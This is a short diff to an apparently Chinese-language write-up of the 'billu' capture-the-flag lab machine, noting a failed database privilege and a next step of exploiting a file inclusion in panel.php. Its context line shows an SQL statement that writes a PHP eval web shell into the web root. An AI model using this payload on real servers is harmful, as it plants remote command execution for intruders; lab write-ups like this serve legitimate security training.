@@ -510,5 +510,6 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 ```go
 \#1045 - Access denied for user 'billu'@'localhost' (using password: YES)
 ```
-没有权限，此路不通
+没有权限，此路不通，所以只能将收集到的Web口令去尝试其他站点位置
+## 6.利用panel.php页面文件包含漏洞
 
